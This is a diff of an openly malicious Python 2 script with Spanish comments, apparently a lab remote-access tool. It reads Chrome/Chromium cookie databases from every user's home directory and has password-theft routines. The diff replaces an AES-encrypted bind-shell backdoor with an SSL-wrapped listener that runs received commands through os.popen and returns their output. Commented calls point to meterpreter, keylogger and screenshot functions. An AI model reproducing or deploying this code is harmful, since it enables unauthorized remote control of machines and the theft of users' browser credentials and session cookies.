@@ -55,6 +55,7 @@ def cookies():
 		#Funciona para chrome y chromium
 		for ruta in glob.glob(r'/home/*/.config/*/Default/Cookies'):
 			conn=sqlite3.connect(ruta)
+
 			for cookie in conn.execute("select * from cookies;"):
 				print cookie
 	chrome()
@@ -75,48 +76,74 @@ def passwd():
 	chrome()
 	firefox()
 
-def backdoor(cliente,pto):
-	from Crypto.Cipher import AES
-	from Crypto import Random
-	import socket
-	import base64
-	import os
-	import subprocess
-	import sys
+def backdoor(s):
+	import os,socket,sys,ssl
+	#n=socket.socket()
+	#n.bind((cliente,pto))
+	#n.listen(6)
+	#ss=ssl.wrap_socket(n,server_side=True,keyfile="llave.pem",certfile="cert.pem",ssl_version=ssl.PROTOCOL_SSLv23)
+	#s,p = ss.accept()
+	while 1:
+	    data = s.recv(1024)
+	    if "q" == data.lower():
+	        s.close()
+	        break;
+	    else:
+	        if data.startswith('cd'):
+	            os.chdir(data[3:].replace('\n',''))
+	            s.send("Directorio: "+str(os.getcwd()))
+	            result='\n'
+	            continue;
+	            #s.send(str(os.getcwd()))
+	        else:
+	            result=os.popen(data).read()
+	    if (data.lower() != "q"):
+	            s.send(str(result))
+	    else:
+	        s.send(str(result))
+	        #s.close()
+	        break;
+	exit()
 
-	EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
-	DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
-	secret = "6666666666ASDFGH"
-	iv = Random.new().read(AES.block_size)
-	cipher = AES.new(secret, AES.MODE_CFB, iv)
-	c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	c.bind((cliente,pto))
-	c.listen(1)
-	s, a = c.accept()
-	s.send(EncodeAES(cipher, '''EN LINEA...
-                (_)_(_)
-                 (o o)
-                  \o/	''' + secret))
 
-	while True:
-		data = s.recv(1024)
-		decrypted = DecodeAES(cipher, data)
-		if decrypted == "exit":
-			break    	
-		proc = subprocess.Popen(decrypted, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-		stdoutput = proc.stdout.read() + proc.stderr.read() + secret
-		encrypted = EncodeAES(cipher, stdoutput)
-		s.send(encrypted)
-	s.close()
-	sys.exit()
-
-#def cifrar():
-	#ADVERTENCIA: Usar solo en lab :'(
-
+def remoto(cliente,pto):
+	import os,socket,sys,ssl
+	n=socket.socket()
+	n.bind((cliente,pto))
+	n.listen(6)
+	ss=ssl.wrap_socket(n,server_side=True,keyfile="llave.pem",certfile="cert.pem",ssl_version=ssl.PROTOCOL_SSLv23)
+	s,p = ss.accept()
+	data = 'W'
+	while 1:
+		#print data
+		if not data or data == 'W' or len(data)==0:
+			data = s.recv(512)
+		elif data == '1':
+			try:
+				backdoor(s)
+				data = 'W'
+			except:
+				print ":'("
+				data = 'W'
+		elif data == '2':
+			try:
+				print "meterpreter :D"
+				s.send('Meterpreter activo')
+				print "saliendo..."
+				data = 'W'
+			except:
+				print "murio :'("
+				data = 'W'
+		else:
+			continue;
+	exit()
 
 #screenshot()
-#meterpreter()
+#meterpreter('192.168.47.134',4444)
 #keylogger()
 #cookies()
-passwd()
-#backdoor()
+#passwd()
+
+
+if __name__ == '__main__':
+	remoto('192.168.47.144',6116)
